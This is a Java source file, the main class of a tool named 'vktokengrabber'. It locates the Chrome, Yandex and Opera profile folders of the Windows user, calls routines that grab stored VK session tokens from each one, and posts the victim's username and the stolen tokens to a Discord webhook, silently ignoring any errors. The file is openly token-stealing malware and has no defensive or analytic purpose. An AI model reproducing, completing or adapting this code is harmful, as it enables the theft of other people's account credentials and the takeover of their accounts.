package com.github.dedinc.vktokengrabber;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import com.github.dedinc.vktokengrabber.browsers.Chrome;
import com.github.dedinc.vktokengrabber.browsers.Opera;
import com.github.dedinc.vktokengrabber.browsers.Yandex;
import com.github.dedinc.vktokengrabber.utils.DiscordHook;

public class Main {

	public static void main(String[] args) {
		String browser = null;
		if (args.length > 0) {
			browser = args[0];
		}
		String username = System.getenv("USERNAME");
		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
		String opera = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software";
		try {			
			DiscordHook.sendMessage("Токенолов2020", "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username);		
		   } catch (Exception e) {
		}
		if (browser == null || browser.equalsIgnoreCase("chrome")) {
			if (new File(chrome).exists()) {
				try {
					DiscordHook.sendMessage("Токенолов2020[Chrome]", Chrome.grabToken());
				   } catch (Exception e) {
				}
			}
		}
		if (browser == null || browser.equalsIgnoreCase("yandex")) {
			if (new File(yandex).exists()) {
				try {
					DiscordHook.sendMessage("Токенолов2020[Yandex]", Yandex.grabToken());
				} catch (Exception e) {
				 }
		    }
		}
		if (browser == null || browser.equalsIgnoreCase("opera")) {
			if (new File(opera).exists()) {
				try {
					DiscordHook.sendMessage("Токенолов2020[Opera]", Opera.grabToken());
				} catch (Exception e) {
				}
			 }
		 }
		DiscordHook.sendMessage("SENTINEL", "TheKirkaYT has been banned! Token Failed :(");
	 }
}
